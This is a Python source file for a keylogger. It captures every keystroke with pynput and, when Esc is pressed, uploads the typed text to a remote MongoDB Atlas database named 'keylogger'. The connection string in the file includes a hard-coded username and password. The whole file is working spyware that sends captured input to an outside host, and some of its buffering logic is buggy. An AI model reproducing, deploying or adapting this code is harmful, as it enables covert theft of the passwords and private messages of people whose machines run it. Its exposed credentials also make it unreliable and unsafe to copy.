import pynput
from pynput.keyboard import Key, Listener
import keyboard
from pymongo import MongoClient
import pymongo

count=0
keys=[]
active=0
arr=[]
def on_press(key):
    global keys,count,active,arr

    if key == Key.enter:

        for i in range(len(keys)):
            if active %2 !=0:
                keys[i] = str(keys[i]).upper()

            if keys[i] == "+":
                active+=1

        
        for i in range(len(keys)):
            if keys[i]=="+":
                pass
            else:
                arr.append(keys[i])

        keys=arr

        keys.append("\n")

        keys=[]
        arr=[]

            
    elif key=='"':
        keys.append('"')
    elif key== Key.shift_r:
        keys.append("")
        
    elif key== Key.ctrl_l:
        keys.append("")

    elif key == Key.space:
        keys.append(" ")  

    elif key == Key.backspace:
        if len(keys)==0:
            pass
        else:
            keys.pop(-1)

    elif key == Key.caps_lock:
        keys.append("+")

    else:
        keys.append(key)
    
    print("{0}".format(key))
    
def print_text(keys):
    text=""
    dbname = get_database()
    collection_name = dbname["messages"]
    
    for key in keys:
        k=str(key).replace("'","")

        if k.find("\n")>0:
            text += k
            
        elif k.find('Key')== -1:
            text += k
    print(text)
    collection_name.insert_one({"message": text})
    print("Inserted into database")
    return False
        
def on_release(key):
    
    if key == Key.esc:
        print_text(keys)
        return False

def get_database():
    # Provide the mongodb atlas url to connect python to mongodb using pymongo
    CONNECTION_STRING = "mongodb+srv://dba_mongo_style:dba_style@stylecluster.ltdi5.mongodb.net/keylogger?w=majority&retryWrites=true"
    # Create a connection using MongoClient. You can import MongoClient or use pymongo.MongoClient
    client = MongoClient(CONNECTION_STRING)
    # Create the database for our example (we will use the same database throughout the tutorial
    return client['keylogger']
  
def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
if __name__== '__main__':
    main()